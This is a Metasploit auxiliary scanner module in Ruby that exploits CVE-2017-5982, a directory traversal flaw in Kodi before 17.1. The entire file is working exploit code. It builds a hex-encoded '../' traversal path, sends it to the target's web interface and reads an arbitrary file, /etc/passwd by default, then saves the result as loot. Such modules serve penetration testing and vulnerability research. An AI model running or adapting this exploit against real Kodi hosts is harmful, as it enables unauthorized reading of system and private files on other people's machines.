##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kodi 17.0 Local File Inclusion Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal flaw found in Kodi before 17.1.
      },
      'References'     =>
        [
          ['CVE', '2017-5982'],
        ],
      'Author'         =>
        [
          'Eric Flokstra',  #Original
          'jvoisin'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Feb 12 2017"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
      ], self.class)
  end


  def run_host(ip)
    base = normalize_uri(target_uri.path)

    peer = "#{ip}:#{rport}"

    print_status("Reading '#{datastore['FILE']}'")

    traverse = '../' * datastore['DEPTH']
    f = datastore['FILE']
    f = f[1, f.length] if f =~ /^\//
    f = "image/image://" + Rex::Text.uri_encode(traverse + f, "hex-all")

    uri = normalize_uri(base, Rex::Text.uri_encode(f, "hex-all"))
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    if res and res.code != 200
      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
      print_error("\t1. File does not exist.")
      print_error("\t2. No permission.")

    elsif res and res.code == 200
      data = res.body.lstrip
      fname = datastore['FILE']
      p = store_loot(
        'kodi',
        'application/octet-stream',
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{fname} stored as '#{p}'")

    else
      print_error('Fail to obtain file for some unknown reason')
    end
  end

end
